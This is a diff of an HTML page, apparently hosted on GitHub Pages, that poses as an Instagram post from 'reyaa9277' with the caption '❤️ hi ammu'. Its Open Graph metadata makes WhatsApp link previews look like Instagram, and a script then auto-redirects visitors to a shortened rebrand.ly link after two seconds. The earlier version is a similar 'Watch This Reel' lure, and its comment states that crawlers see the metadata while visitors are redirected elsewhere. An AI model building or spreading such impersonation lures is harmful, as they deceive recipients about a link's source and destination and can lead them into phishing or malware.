@@ -1,58 +1,188 @@
-<!doctype html>
+
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Watch This Reel</title>
-  <meta name="description" content="Tap to open and watch now.">
 
-  <!-- Open Graph metadata used by WhatsApp link previews -->
+  <title>Instagram</title>
+  <meta name="description" content="❤️ hi ammu">
+
+  <!-- WhatsApp link preview -->
   <meta property="og:type" content="website">
-  <meta property="og:site_name" content="Watch This Reel">
-  <meta property="og:title" content="🔥 Watch This Reel!">
-  <meta property="og:description" content="Tap to open and watch now.">
+  <meta property="og:site_name" content="Instagram">
+  <meta property="og:title" content="❤️ hi ammu">
+  <meta property="og:description" content="View this post on Instagram.">
   <meta property="og:url" content="https://q5542577-arch.github.io/watch/watch.html">
   <meta property="og:image" content="https://q5542577-arch.github.io/watch/reel-thumbnail.png">
   <meta property="og:image:secure_url" content="https://q5542577-arch.github.io/watch/reel-thumbnail.png">
-  <meta property="og:image:type" content="image/png">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
 
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="🔥 Watch This Reel!">
-  <meta name="twitter:description" content="Tap to open and watch now.">
+  <meta name="twitter:title" content="❤️ hi ammu">
   <meta name="twitter:image" content="https://q5542577-arch.github.io/watch/reel-thumbnail.png">
-  <meta name="theme-color" content="#101014">
 
   <style>
-    * { box-sizing: border-box; }
-    body {
-      margin: 0; min-height: 100vh; display: grid; place-items: center;
-      padding: 24px; background: #101014; color: #fff;
-      font-family: Arial, Helvetica, sans-serif; text-align: center;
+    * {
+      box-sizing: border-box;
     }
-    main { width: min(100%, 520px); }
-    .poster { overflow: hidden; border: 1px solid #532333; border-radius: 20px; box-shadow: 0 18px 55px #0009; }
-    .poster img { display: block; width: 100%; height: auto; }
-    h1 { margin: 24px 0 8px; font-size: clamp(27px, 6vw, 38px); }
-    p { color: #d0cbd2; line-height: 1.5; }
-    a { display: inline-block; margin-top: 12px; padding: 14px 25px; border-radius: 999px; background: #ff3158; color: #fff; text-decoration: none; font-weight: bold; }
-    .note { color: #98919d; font-size: 13px; }
+
+    body {
+      margin: 0;
+      background: #fafafa;
+      color: #262626;
+      font-family: Arial, sans-serif;
+    }
+
+    .topbar {
+      height: 60px;
+      background: white;
+      border-bottom: 1px solid #dbdbdb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 25px;
+      font-weight: bold;
+      font-family: cursive;
+    }
+
+    .post {
+      width: 100%;
+      max-width: 470px;
+      margin: 25px auto;
+      background: white;
+      border: 1px solid #dbdbdb;
+    }
+
+    .profile {
+      display: flex;
+      align-items: center;
+      padding: 12px;
+      gap: 11px;
+    }
+
+    .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf);
+      padding: 2px;
+    }
+
+    .avatar-inner {
+      height: 100%;
+      width: 100%;
+      border-radius: 50%;
+      background: #fff;
+      display: grid;
+      place-items: center;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    .username {
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .post-image {
+      width: 100%;
+      display: block;
+      object-fit: cover;
+    }
+
+    .actions {
+      padding: 12px 12px 5px;
+      display: flex;
+      gap: 18px;
+      font-size: 25px;
+    }
+
+    .caption {
+      padding: 5px 12px 12px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .caption strong {
+      margin-right: 5px;
+    }
+
+    .reply {
+      color: #8e8e8e;
+      font-size: 13px;
+      padding: 0 12px 14px;
+    }
+
+    .redirect {
+      text-align: center;
+      padding: 12px;
+      color: #8e8e8e;
+      font-size: 12px;
+    }
+
+    .redirect a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    @media (max-width: 500px) {
+      .post {
+        margin: 0 auto;
+        border-left: 0;
+        border-right: 0;
+      }
+    }
   </style>
 </head>
+
 <body>
-  <main>
-    <div class="poster">
-      <img src="https://q5542577-arch.github.io/watch/reel-thumbnail.png" alt="Watch this Reel">
+
+  <div class="topbar">Instagram</div>
+
+  <div class="post">
+
+    <div class="profile">
+      <div class="avatar">
+        <div class="avatar-inner">R</div>
+      </div>
+      <div class="username">reyaa9277</div>
     </div>
-    <h1>Opening your Reel…</h1>
-    <p>You are being redirected. If nothing happens, tap the button below.</p>
-    <a href="https://rebrand.ly/wy6aeza" rel="noopener">WATCH NOW</a>
-    <p class="note">You will continue to the requested destination.</p>
-  </main>
+
+    <img
+      class="post-image"
+      src="https://q5542577-arch.github.io/watch/reel-thumbnail.png"
+      alt="Instagram post"
+    >
+
+    <div class="actions">
+      <span>♡</span>
+      <span>♡</span>
+      <span>➤</span>
+    </div>
+
+    <div class="caption">
+      <strong>reyaa9277</strong> ❤️hi ammu
+    </div>
+
+    <div class="reply">View all comments</div>
+
+    <div class="redirect">
+      Opening post...<br>
+      If you are not redirected,
+      <a href="https://rebrand.ly/wy6aeza">tap here</a>.
+    </div>
+
+  </div>
+
   <script>
-    // Social preview crawlers read the metadata above. Visitors are redirected here.
-    window.location.replace("https://rebrand.ly/wy6aeza");
+    // Automatically redirect after 2 seconds
+    setTimeout(function () {
+      window.location.replace("https://rebrand.ly/yw2cy7r");
+    }, 2000);
   </script>
+
 </body>
 </html>
